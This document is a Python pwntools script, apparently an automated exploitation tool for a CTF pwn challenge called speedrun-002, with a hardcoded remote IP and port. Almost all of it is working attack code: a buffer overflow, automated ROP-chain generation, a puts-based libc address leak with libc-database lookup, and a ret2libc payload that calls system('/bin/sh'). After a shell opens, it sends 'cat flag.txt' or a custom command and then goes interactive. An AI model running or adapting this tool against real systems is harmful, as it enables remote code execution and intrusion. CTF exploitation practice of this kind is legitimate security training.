from pwn import *
# from ropgenerator import *
from struct import pack
import re, os, sys, subprocess, pwnlib, binascii
import ABEModules as ABE

try:
    from ropper import RopperService
except:
    print("Ropper is needed for Ropchain! manual install or use -init(WIP)")
    pass
helpmsg = " \n Usage: to Work correctly you have to fill out the midroll and postroll(when using ret2libc etc..)\n to ensure that the script gets the correct vulnerable entrypoint!\n -f <filename>\n -core (Use coredumps)\n -vic <ip> <port>\n -ibu <startbufsize>\n -NoDas (No dealarm shell)\n -loc (localonly)\n -fupa <fullPath>\n -h help\n -gen <generator> (ropper(default)/RopGad/ropperService/RopGen)\n -debug (noCore)\n -debugCore (debug with coredump,only local)\n -a <attackType> (rop(default)/ret2libc/SOS(shellcode on stack(WIP!!))\n -libc <path to libc>\n -flag (auto cat flag.txt;cat flag)\n -cmd  <shellcommand> (custom shell command to be executed as string) \n -init (WIP!!!! do NOT use if you dont know what it does!!!)\n      use sudo python AutoB...)"
binfupa = "/root/PycharmProjects/SaarSec/speedrun-002"  # HowToUse Full Path to file without "./"#
binaryfile = "speedrun-002"  # HowToUse Filename#
remIP = "78.46.187.115"  # HowToUse set remote IP as String#
remPort = 20015  # HowToUse set remote Port as int#
payroll = 1032  # HowToUse Set Buffer Start Size#
binny = "./" + binaryfile
UseCore = False
LocalOnly = False
generator = "ropper"
toolpa = "./ABEToolChain/"
dealarm = True
debugfinalPayload = False
debugfinalPayloadCore = False
isStatical = True
attackType = "rop"
AutoAttackType = True
pathtolibc = "libc-2.28-debian-10.so"
manuallibc = False
autoCatflag = False
ForcedLoc = False
shellcmd = None



def preroll(rem):  # HowToUse False for remote True for binary
    global ForcedLoc
    if rem or ForcedLoc:
        rm = process(binny)
    else:
        try:
            rm = remote(remIP, remPort)  # HowToUse True for server False for local
        except:
            cont = str(
                raw_input("Unable to connect! Is the Target still up?\nDo you want to run it locally instead? (y/n)\n"))
            if "y" in cont:
                rm = process(binny)
                ForcedLoc = True
            else:
                exit(0)
    # HowToUse Preperation before real BufferOverflow Vuln#
    # ====================================================#
    return midroll(rm)
    pass


def midroll(rm):  # TODO insert Prepping
    rm.recvuntil("What say you now?")
    rm.sendline("Everything intelligent is so boring.\n")
    rm.recvuntil("Tell me more.")
    return rm


def postroll(rem):  # TODO there to catch shit that comes back!
    rem.recvuntil("Fascinating.\n")
    return rem





def rolling():
    globals()
    context.binary = binny

def attack(log, buffer):
    global attackType
    attackTypes = {"rop": ropattack, "ret2libc": ret2libcattack, "SOS": shellcodeattack}
    func = attackTypes.get(attackType, ropattack)
    func(log, buffer)


def ropattack(logGen, buffer):
    globals()
    logGen.status("Trying to find a //bin/sh ropchain!")
    context.log_level = "ERROR"
    sleep(0.1)
    shellcode = ropchain(logGen)
    sleep(0.1)
    context.log_level = "WARNING"
    if shellcode == None:
        attackType = "ret2libc"
        return attack(logGen, buffer)
    logGen.status("RopChain found!")
    shell = open("shell", "w")
    payload = buffer + shellcode
    shell.write(payload)
    shell.close()
    logGen.status("connecting to target server!")
    rm = preroll(LocalOnly)  # HowToUse True for server False for local
    logGen.success("Sending Payload! Here comes the Shell!")  # TODO Change control Flow in case of failing attack type
    if debugfinalPayloadCore:
        debugPayload(rm, payload)
    else:
        SnC(rm, payload)
    exit(0)  # TODO cause of while true loop

def ret2libcattack(logGen, buffer):
    globals()
    logGen.status("Trying a ret2libc attack!")
    remlib = False
    if not manuallibc:  # no manual
        if LocalOnly:  # pwntools lib
            libcELF = e.libc
            libc = libcELF.path
        else:
            libc = libcfinder(logGen, buffer)
            remlib = True
    else:  # manual
        libcELF = e.libc
        libc = pathtolibc
    if debugfinalPayload:
        context.log_level = "debug"
    else:
        pass
    rop = ROP(e)
    logGen.status("Found libc ! : " + libc)
    while (True):
        logGen.status("Trying libc " + libc)
        if libc is not None:  # Assuring that ELF uses a libc
            symbls = map(str, e.plt)
            if "puts" in symbls:
                puts_plt = e.plt["puts"]
                try:
                    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
                    libc_start_main = e.symbols["__libc_start_main"]
                    entry = e.entry
                except:
                    exit(0)  # TODO insert stack pivoting here!
                    pass
                payload = buffer + p64(pop_rdi) + p64(libc_start_main) + p64(puts_plt) + p64(entry)
            elif False:  # TODO add more ways for ret2libc (puts)
                pass
            rm = preroll(LocalOnly)  # HowToUse True for server False for local
            rm.sendline(payload)
            rm = postroll(rm)
            libcmain = u64(rm.recv(6).ljust(8, "\x00"))
            if remlib:
                os.system(toolpa + "libcdb/dump " + libc + " > offsets")
                os.system(toolpa + "libcdb/dump " + libc + " __libc_start_main >> offsets")
                off = open("offsets", "r")
                offsets = off.read()
                off.close()
                # exit(0)
                offset___libc_start_main_ret = int((offsets.split("\n")[0]).split(" = ")[1], 0)
                offset_system = int((offsets.split("\n")[1]).split(" = ")[1], 0)
                offset_dup2 = int((offsets.split("\n")[2]).split(" = ")[1], 0)
                offset_read = int((offsets.split("\n")[3]).split(" = ")[1], 0)
                offset_write = int((offsets.split("\n")[4]).split(" = ")[1], 0)
                offset_str_bin_sh = int((offsets.split("\n")[5]).split(" = ")[1], 0)
                offset__libc_start_main = int((offsets.split("\n")[6]).split(" = ")[1], 0)
                libcbase = libcmain - offset__libc_start_main
                BINSH = libcbase + offset_str_bin_sh
                SYSTEM = libcbase + offset_system
            else:
                libcbase = libcmain - libcELF.sym["__libc_start_main"]
                BINSH = next(libcELF.search("/bin/sh"))  # Verify with find /bin/sh
                SYSTEM = libcELF.sym["system"]
                # EXIT = libc.sym["exit"]
            payload2 = buffer + p64(pop_rdi) + p64(BINSH) + p64(SYSTEM)  # + p64(EXIT)
            rm = midroll(rm)
            logGen.status(
                "Sending Payload! Here comes the Shell!")  # TODO Change control Flow in case of failing attack type
            try:
                if debugfinalPayloadCore:
                    debugPayload(rm, payload2)
                else:
                    SnC(rm, payload2)
                logGen.success("Sending Payload! Here comes the Shell!")
                if libc is not lib3 and (autoCatflag or shellcmd is not None):  # TODO remove False if needed
                    cont = str(raw_input("Got A Shell? If not do you to try another libc?(y/n)\n"))
                    if "y" in cont:
                        raise Exception
                    else:
                        # print "SHOULD EXIT"
                        exit(0)
                else:
                    pass
                    exit(0)  # TODO fix if needed
            except SystemExit:
                exit(0)
            except:
                # print"EXCEPTTTTT"
                if libc == lib1:
                    libc = lib2
                    # print("first switch worked")
                elif libc == lib2:
                    libc = lib3
                else:
                    logGen.failure("No working Libc was found! Exiting....")
                    exit(0)
            pass
        else:
            exit(0)  # TODO Stack pivot?


def libcfinder(logGen, buffer):  # TODO WIP still missing exact way to determine libc and getting the file
    # return "libc-2.28-debian-10.so"
    globals()
    logGen.status("Trying to find remote libcVersion")
    rm = preroll(LocalOnly)  # TODO LocalOnly???
    rop = ROP(e)
    symbls = map(str, e.plt)
    # print symbls
    # print map(str,e.symbols)
    if "puts" in symbls:
        puts_plt = p64(e.plt["puts"])
        try:
            pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
            libc_start_main = p64(e.symbols["__libc_start_main"])
            puts_got = p64(e.got["puts"])
            payload = buffer + pop_rdi + libc_start_main + puts_plt + pop_rdi + puts_got + puts_plt
        except:
            pass
        rm.sendline(payload)
        rm = postroll(rm)
        libcmain = u64(rm.recv(6).ljust(8, "\x00"))
        rm.recvuntil("\n")  # TODO fix this hardcoding stuff !!!!!!!!!!!!!!!
        putslib = u64(rm.recv(6).ljust(8, "\x00"))
        # leak_addrmain = hex(libcmain)
        # leak_puts = hex(putslib)
        # print leak_addrmain
        # print leak_puts
        os.system(toolpa + "libcdb/find __libc_start_main " + hex(libcmain) + ">libcanal")
        lican = open("libcanal", "r")
        licanal = lican.read()
        lican.close()
        # print licanal
        try:
            lib1name = (licanal.split("id ")[1]).split(")")[0]
            global lib1
            lib1 = lib1name
        except:
            pass
        try:
            lib2name = (licanal.split("id ")[2]).split(")")[0]
            global lib2
            lib2 = lib2name
        except:
            pass
        try:
            lib3name = (licanal.split("id ")[3]).split(")")[0]
            global lib3
            lib3 = lib3name
        except:
            pass
        return lib1
        # return "libc-2.28-debian-10.so"


def shellcodeattack(log, buffer):
    pass


def SnC(rm, payload):
    globals()
    if debugfinalPayload:
        context.log_level = "debug"
    rm.sendline(payload)
    sleep(1)
    rm = postroll(rm)
    rm.clean()
    if shellcmd:
        rm.sendline(shellcmd)
    if autoCatflag and shellcmd is None:
        rm.sendline("cat flag.txt")#;cat flag")
    if dealarm and not LocalOnly and not autoCatflag and shellcmd is None:
        dealarm_shell(rm)
    if rm.connected("read"):
        sleep(1)
    else:
        raise Exception
    config._logGen.success("Here Comes The Shell!")
    rm.interactive()
    rm.wait()


def debugPayload(rm, payload):
    context.log_level = "debug"
    os.remove("./core")
    rm.sendline(payload)
    sleep(1)
    if autoCatflag:
        rm.sendline("cat flag.txt;cat flag")
    if dealarm and not LocalOnly and not autoCatflag:
        dealarm_shell(rm)
    rm.interactive()
    core = Coredump("./core")
    print core.registers


def ropchain(logGen):  # Todo implement more Generators and features
    global generator
    gens = {"ropper": ropchainRopper, "ropperService": ropchainRopperService, "RopGad": ropchainGadget,
            "RopGen": ropchainGenerator}
    funct = gens.get(generator, ropchainRopper)
    payload = funct(logGen)
    # if payload is not None:
    return payload


def ropchainRopper(logGen):  # Superfast and working TODO implement more CMDS
    ShellCom = "execve"
    command = "ropper -f " + binaryfile + " --chain " + ShellCom + "  > shellcode.txt"
    os.system(command)
    output = open("shellcode.txt", "r")
    out = output.read()
    # =====================================================# checking for failure
    failmsg = "# INSERT SYSCALL GADGET HERE"
    if failmsg in out:
        logGen.status("Ropper didnt work! trying ROPgadget now!")
        return ropchainGadget(logGen)
    # =====================================================#
    code = out.split("generator #\n")[1]
    tes = code.split("\n")
    lentes = len(tes)
    for x in range(lentes):
        tes[x] = tes[x].lstrip()
    res = tes[6:lentes - 2]
    pay = "from struct import pack\n" + tes[4] + "\ndef p(x):\n    return pack('Q',x)\ndef rebase_0(x):\n    " + tes[
        4] + "\n    return pack('Q',x+IMAGE_BASE_0)\n" + \
          "\n".join(res) + "\nROP=open('chain','w')\nROP.write(rop)\nROP.close()"
    pay = escape_ansi(pay)
    # print"======================"
    # print pay
    # print"======================"

    module = open("payloader.py", "w")
    module.write(pay)
    module.close()
    execfile("payloader.py")
    chain = open("chain", "r")
    load = chain.read()
    chain.close()
    # print load
    return load







def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)

def AutoAttack(config):
    globals()
    if AutoAttackType:
        analELF(config)
    else:
        pass


def parseargs():
    globals()
    global config
    config = Config()
    arglist = sys.argv
    argn = len(arglist)
    avargs = {"-f": setFilename, "-core": setCore, "-vic": setVictim, "-ibu": setinitBuff,
              "-loc": setLocalOnly, "-fupa": setFullPath, "-h": help, "-gen": setGen, "-NoDas": setNoDealarm,
              "-debug": setDebug, "-debugCore": setDebugCore, "-a": setAttackType, "-libc": setlibc,
              "-flag": setgetflag, "-init": initToolChains, "-cmd": setShellCmd}
    for x in range(argn):
        arg = arglist[x]
        funct = avargs.get(arg, Pass)
        funct(x, config)
    global e
    e = ELF(binaryfile)
    config._elf = e
    return config


def setShellCmd(x, config):
    global shellcmd
    shellcmd = sys.argv[x + 1]
    config._shellcmd = sys.argv[x + 1]


def setgetflag(x, config):
    global autoCatflag
    autoCatflag = True
    config._autoCatflag = True


def setlibc(x, config):
    global pathtolibc, manuallibc
    pathtolibc = sys.argv[x + 1]
    config._pathtolibc = sys.argv[x + 1]
    manuallibc = True
    config._manuallibc = True


def setAttackType(x, config):
    global attackType, AutoAttackType
    attackType = sys.argv[x + 1]
    config._attackType = sys.argv[x + 1]
    AutoAttackType = False
    config._AutoAttackType = False


def setDebugCore(x, config):
    global debugfinalPayloadCore
    debugfinalPayloadCore = True
    config._debugfinalPayloadCore = True


def setDebug(x, config):
    global debugfinalPayload
    debugfinalPayload = True
    config._debugfinalPayload = True


def setNoDealarm(x, config):
    global dealarm
    dealarm = False
    config._dealarm = False


def setGen(x, config):
    global generator
    generator = sys.argv[x + 1]
    config._generator = sys.argv[x + 1]


def Pass(x, config): pass


def help(x, config):
    global helpmsg
    print str(sys.argv[0]) + helpmsg
    exit(0)


def setFilename(x, config):
    global binaryfile, binny
    binaryfile = sys.argv[x + 1]
    config._binaryfile = sys.argv[x + 1]
    binny = "./" + binaryfile
    config._binny = "./" + binaryfile


def setCore(x, config):
    global UseCore
    UseCore = True
    config._UseCore = True


def setLocalOnly(x, config):
    global LocalOnly
    LocalOnly = True
    config._LocalOnly = True


def setVictim(x, config):
    global remIP, remPort
    remIP = sys.argv[x + 1]
    config._remIP = sys.argv[x + 1]
    remPort = int(sys.argv[x + 2])
    config._remPort = int(sys.argv[x + 2])


def setinitBuff(x, config):
    global payroll
    payroll = int(sys.argv[x + 1])
    config._payroll = int(sys.argv[x + 1])


def setFullPath(x, config):
    global binfupa
    binfupa = sys.argv[x + 1]
    config._binfupa = sys.argv[x + 1]


def one_gadget(filename):
    return map(str, subprocess.check_output(['one_gadget', '', filename]).split(' '))


def analELF(config):
    global e, attackType
    if e.execstack and False:  # TODO implement Shellcode on stack
        attackType = "SOS"
        config._attackType = "SOS"
    elif e.statically_linked:
        config._attackType = "rop"
    else:
        config._attackType = "ret2libc"


def initToolChains(x, config):
    if os.path.isdir("./ABEToolChain"):
        pass
    else:
        os.mkdir("ABEToolChain")
    if os.path.isdir("./ABEToolChain/libcdb"):
        pass
    else:
        os.system("git clone https://github.com/niklasb/libc-database.git ./ABEToolChain/libcdb")
        os.system("./ABEToolChain/libcdb/get")
        print "If something fails , run './ABEToolChain/libcdb/get'  ! \n"
        pass
    if os.path.isdir("./ABEToolChain/ropgenerator"):
        pass
    else:
        pass  # TODO ropgenerator ... not needed at this moment
    if os.path.isdir("./ABEToolChain/ropper"):
        pass
    else:
        os.system("pip install capstone --user;pip install keystone-engine --user ")
        os.system("git clone https://github.com/sashs/ropper.git ./ABEToolChain/ropper")
        os.system("cd ABEToolChain/ropper ; git submodule init ; git submodule update ; python setup.py install --user")
    exit(0)


def rickroll():
    config = parseargs()
    AutoAttack(config)
    dump=ABE.init(config)
    ABE.libMe()


class Config:
    _binfupa = "/root/PycharmProjects/SaarSec/speedrun-002"  # HowToUse Full Path to file without "./"#
    _binaryfile = "speedrun-002"  # HowToUse Filename#
    _remIP = "78.46.187.115"  # HowToUse set remote IP as String#
    _remPort = 20015  # HowToUse set remote Port as int#
    _payroll = 1020  # HowToUse Set Buffer Start Size#
    _binny = "./" + binaryfile
    _UseCore = False
    _LocalOnly = False
    _generator = "ropper"
    _toolpa = "./ABEToolChain/"
    _dealarm = True
    _debugfinalPayload = False
    _debugfinalPayloadCore = False
    _isStatical = True
    _attackType = "rop"
    _AutoAttackType = True
    _pathtolibc = "libc-2.28-debian-10.so"
    _manuallibc = False
    _autoCatflag = False
    _ForcedLoc = False
    _shellcmd = None
    _elf = None
    _logGen = None
    def midroll(self,rm):
        return midroll(rm)
    def postroll(self,rm):
        return postroll(rm)
    def preroll(self,rm):
        return preroll(rm)
    def SnC(self,rm,paylaod):
        SnC(rm,paylaod)
    def debugPayload(self,rm,payload):
        debugPayload(rm,payload)




if __name__ == '__main__':
    rickroll()
    # rolling()
